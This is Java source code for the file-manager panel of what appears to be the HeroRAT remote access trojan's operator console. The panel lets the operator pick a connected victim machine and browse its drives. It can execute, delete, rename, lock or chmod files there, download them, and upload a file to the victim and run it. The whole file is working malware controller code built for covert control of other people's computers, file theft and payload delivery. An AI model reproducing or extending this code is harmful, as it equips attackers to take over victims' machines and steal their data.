package net.herorat.gui;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;

import javax.swing.BorderFactory;
import javax.swing.DropMode;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.border.TitledBorder;

import net.herorat.features.file.File;
import net.herorat.features.servers.Server;
import net.herorat.network.Network;
import net.herorat.utils.Utils;


public class PanelFile extends JPanel
{
	private static final long serialVersionUID = -3831734979469272408L;
	
	private JLabel label_select;
	public JComboBox<String> combo_select;
	public String combo_selected_item = "";
	
	private JPopupMenu menu_dropdown;
	
	private JLabel label_path;
	public JTextField field_path;
	private JButton button_path;
	public String current_path = "";
	
	public TableModel model_roots;
	public TableModel model_files;
	private JTable table_roots;
	private JTable table_files;
	private JScrollPane scroll_roots;
	private JScrollPane scroll_files;
	
	private JFileChooser chooser = new JFileChooser();
	private JTextField field_send;
	private JButton button_browse;
	private JButton button_send;
	
	private JFileChooser chooser_save;
	
	public PanelFile()
	{
		initComponents();
		display();
	}

	private void initComponents()
	{
		setLayout(new BorderLayout(5, 0));
		createSelect();
		createDropDown();
		createTable();
		createPanel();
	}
	
	private void display()
	{
		setVisible(true);
	}
	
	private void createSelect()
	{
		label_select = new JLabel("Select an user: ");
		combo_select = new JComboBox<String>( Network.getServerList(false) );
		
		label_path = new JLabel("Path: ");
		field_path = new JTextField();
		button_path = new JButton("Go");
		button_path.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				Server server = Network.findWithCombo(combo_selected_item);
				if (server != null) File.sendCd(server, field_path.getText());
			}
		});
		
		JPanel top_panel = new JPanel();
		top_panel.setLayout(new BorderLayout(5, 0));
		
		JPanel first_panel = new JPanel();
		first_panel.setLayout(new BorderLayout(5, 0));
		first_panel.setBorder(BorderFactory.createEmptyBorder(0, 2, 0, 2));
		first_panel.add(label_select, BorderLayout.LINE_START);
		first_panel.add(combo_select);
		top_panel.add(first_panel, BorderLayout.NORTH);
		
		JPanel second_panel = new JPanel();
		second_panel.setLayout(new BorderLayout(5, 0));
		second_panel.setBorder(BorderFactory.createEmptyBorder(5, 2, 5, 2));
		second_panel.add(label_path, BorderLayout.LINE_START);
		second_panel.add(field_path);
		second_panel.add(button_path, BorderLayout.LINE_END);
		top_panel.add(second_panel, BorderLayout.SOUTH);
		
		add(top_panel, BorderLayout.NORTH);
		
		combo_select.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0)
			{
				String selection = String.valueOf(combo_select.getSelectedItem());
				if (combo_select.getSelectedIndex() != 0 && !selection.equals(combo_selected_item))
				{
					combo_selected_item = selection;
					Server server = Network.findWithCombo(combo_selected_item);
					if (server != null)
					{
						// INIT DATA TRANSFERT
						File.sendPath(server);
						File.sendRoot(server);
						File.sendCd(server, "");
					}
				}
				else if (combo_select.getSelectedIndex() == 0)
				{
					combo_selected_item = "";
					field_path.setText("");
					for(int i=model_roots.getRowCount() - 1; i>=0; i--) model_roots.removeRow(i);
					for(int i=model_files.getRowCount() - 1; i>=0; i--) model_files.removeRow(i);
				}
			}
		});
	}
	
	private void createDropDown()
	{
		menu_dropdown = new JPopupMenu();
		
		JMenuItem item = new JMenuItem();
		item.setText("Execute");
		item.setIcon(new ImageIcon(Utils.toByteArray(this.getClass().getClassLoader().getResourceAsStream("/images/execute.gif"))));
		item.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				String file = current_path + table_files.getValueAt(table_files.getSelectedRow(), 1).toString();
				Server server = Network.findWithCombo(combo_selected_item);
				if (server != null) File.sendExec(server, file);
			}
		});
		menu_dropdown.add(item);
		
		item = new JMenuItem();
		item.setText("Edit");
		item.setIcon(new ImageIcon(Utils.toByteArray(this.getClass().getClassLoader().getResourceAsStream("/images/logger.png"))));
		item.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				String file = current_path + table_files.getValueAt(table_files.getSelectedRow(), 1).toString();
				Server server = Network.findWithCombo(combo_selected_item);
				if (server != null) File.sendEdit(server, file);
			}
		});
		menu_dropdown.add(item);
		
		item = new JMenuItem();
		item.setText("Delete");
		item.setIcon(new ImageIcon(Utils.toByteArray(this.getClass().getClassLoader().getResourceAsStream("/images/remove.png"))));
		item.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				String file = current_path + table_files.getValueAt(table_files.getSelectedRow(), 1).toString();
				Server server = Network.findWithCombo(combo_selected_item);
				if (server != null) File.sendDelete(server, file);
			}
		});
		menu_dropdown.add(item);
		
		item = new JMenuItem();
		item.setText("Rename");
		item.setIcon(new ImageIcon(Utils.toByteArray(this.getClass().getClassLoader().getResourceAsStream("/images/rename.gif"))));
		item.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				String file = current_path + table_files.getValueAt(table_files.getSelectedRow(), 1).toString();
				Server server = Network.findWithCombo(combo_selected_item);
				String newName = (String)JOptionPane.showInputDialog(null, "Rename this file:", "Rename " + file, JOptionPane.QUESTION_MESSAGE, null, null, null);
				if (server != null) File.sendRename(server, file, newName);
			}
		});
		menu_dropdown.add(item);
		
		item = new JMenuItem();
		item.setText("Lock");
		item.setIcon(new ImageIcon(Utils.toByteArray(this.getClass().getClassLoader().getResourceAsStream("/images/lock.png"))));
		item.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				String file = current_path + table_files.getValueAt(table_files.getSelectedRow(), 1).toString();
				Server server = Network.findWithCombo(combo_selected_item);
				if (server != null) File.sendLock(server, file);
			}
		});
		menu_dropdown.add(item);
		
		item = new JMenuItem();
		item.setText("Unlock");
		item.setIcon(new ImageIcon(Utils.toByteArray(this.getClass().getClassLoader().getResourceAsStream("/images/unlock.png"))));
		item.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				String file = current_path + table_files.getValueAt(table_files.getSelectedRow(), 1).toString();
				Server server = Network.findWithCombo(combo_selected_item);
				if (server != null) File.sendUnlock(server, file);
			}
		});
		menu_dropdown.add(item);
		
		item = new JMenuItem();
		item.setText("Rights");
		item.setIcon(new ImageIcon(Utils.toByteArray(this.getClass().getClassLoader().getResourceAsStream("/images/rights.png"))));
		item.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				String file = current_path + table_files.getValueAt(table_files.getSelectedRow(), 1).toString();
				Server server = Network.findWithCombo(combo_selected_item);
				String rights = "";
				rights = (String)JOptionPane.showInputDialog(null, "Enter the new rights value (ex: 777):");
				if (server != null && Integer.parseInt(rights) > 0) File.sendChmod(server, file, rights);
			}
		});
		menu_dropdown.add(item);
		
		item = new JMenuItem();
		item.setText("Download");
		item.setIcon(new ImageIcon(Utils.toByteArray(this.getClass().getClassLoader().getResourceAsStream("/images/download.png"))));
		chooser_save = new JFileChooser();
		item.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				String file = current_path + table_files.getValueAt(table_files.getSelectedRow(), 1).toString();
				Server server = Network.findWithCombo(combo_selected_item);
				if (server != null && chooser_save.showSaveDialog(null) == 0)
				{
					File.sendDownload(server, file, chooser_save.getSelectedFile().getAbsolutePath());
				}
			}
		});
		menu_dropdown.add(item);
	}
	
	private void createTable()
	{		
		table_roots = new JTable();
        table_files = new JTable();
        
        model_roots = new TableModel(new String[] { "", "Letter", "Name" });
        model_files = new TableModel(new String[] { "Type", "Name", "Size" });
        
        table_roots.setModel(model_roots);
        table_files.setModel(model_files);
        
        table_roots.setRowHeight(32);
        table_files.setRowHeight(20);
        
        table_roots.getTableHeader().setReorderingAllowed(false);
        table_files.getTableHeader().setReorderingAllowed(false);
		
		table_files.setComponentPopupMenu(menu_dropdown);
		table_files.setDropMode(DropMode.ON);
		table_files.setSelectionMode(0);
		table_files.addMouseListener(new MouseAdapter() {
			public void mouseClicked(MouseEvent evt) {}
			public void mousePressed(MouseEvent evt)
			{
				int t = (int) (evt.getPoint().getY() / 20.0D);
				table_files.getSelectionModel().setSelectionInterval(t, t);
			}
		});
        
		table_roots.getColumn("").setMaxWidth(32);
        table_roots.getColumn("").setMinWidth(32);
        table_roots.getColumn("Letter").setMaxWidth(64);
        table_roots.getColumn("Letter").setMinWidth(64);
        
        table_files.getColumn("Type").setMaxWidth(48);
        table_files.getColumn("Type").setMinWidth(48);
        table_files.getColumn("Size").setMaxWidth(128);
        table_files.getColumn("Size").setMinWidth(128);
		
		for (int i=0; i<table_roots.getColumnModel().getColumnCount(); i++) table_roots.getColumnModel().getColumn(i).setCellRenderer(new TableRendererRoot());
		for (int i=0; i<table_files.getColumnModel().getColumnCount(); i++) table_files.getColumnModel().getColumn(i).setCellRenderer(new TableRendererFile());
		JLabel cell = ((JLabel)(table_files.getColumnModel().getColumn(0).getCellRenderer()));
		cell.setHorizontalAlignment(JLabel.CENTER);
		cell = ((JLabel)(table_roots.getColumnModel().getColumn(0).getCellRenderer()));
		cell.setHorizontalAlignment(JLabel.CENTER);	
		
        scroll_roots = new JScrollPane(table_roots);
        scroll_roots.setPreferredSize(new Dimension(200, 0));
        scroll_files = new JScrollPane(table_files);
		
        add(scroll_roots, BorderLayout.WEST);
        add(scroll_files, BorderLayout.CENTER);
		
		table_roots.addMouseListener(new MouseAdapter() {
			public void mouseClicked(MouseEvent e)
			{
				if (e.getClickCount() == 2)
				{
					Server server = Network.findWithCombo(combo_selected_item);
					if (server != null) 
					{
						String dir = table_roots.getValueAt(table_roots.getSelectedRow(), 1).toString();
						File.sendCd(server, dir);
						current_path = dir;
						field_path.setText(dir);
					}
				}
			}
		});
		
		table_files.addMouseListener(new MouseAdapter() {
			public void mouseClicked(MouseEvent e)
			{
				if (e.getClickCount() == 2)
				{
					Server server = Network.findWithCombo(combo_selected_item);
					if (server != null)
					{
						String file;
						if (table_files.getValueAt(table_files.getSelectedRow(), 1).toString().equals("."))
						{
							file = current_path;
						}
						else if (table_files.getValueAt(table_files.getSelectedRow(), 1).toString().equals(".."))
						{
							String[] path_parts = current_path.substring(0, current_path.length() - 1).split("/");
							String last = path_parts[path_parts.length - 1];
							file = current_path.substring(0, current_path.length() - last.length() - 1);
							if (file.equals("/")) return;
						}
						else
						{
							file = current_path + table_files.getValueAt(table_files.getSelectedRow(), 1).toString();
						}
						
						if (table_files.getValueAt(table_files.getSelectedRow(), 0).toString().equals("DIR"))
						{
							File.sendCd(server, file);
						}
					}
				}
			}
		});
	}
	
	private void createPanel()
	{
		field_send = new JTextField();
		field_send.setPreferredSize(new Dimension(200, 20));
		button_browse = new JButton("Browse");
		button_browse.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				 if (chooser.showOpenDialog(null) == 0) field_send.setText(chooser.getSelectedFile().getAbsolutePath());
			}
		});
		button_browse.setPreferredSize(new Dimension(90, 25));
		
		button_send = new JButton("Send and execute");
		button_send.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				Server server = Network.findWithCombo(combo_selected_item);
				if (server != null) File.sendUpload(server, field_send.getText());
			}
		});
		button_send.setPreferredSize(new Dimension(200, 25));
		
		JPanel bottom_panel = new JPanel();
		JPanel panel = new JPanel();
		TitledBorder titled = new TitledBorder("Send and execute a file");
		panel.setBorder(titled);
		panel.setPreferredSize(new Dimension(600, 60));
		panel.add(field_send);
		panel.add(button_browse);
		panel.add(button_send);
		bottom_panel.add(panel);
		add(bottom_panel, BorderLayout.SOUTH);
	}
}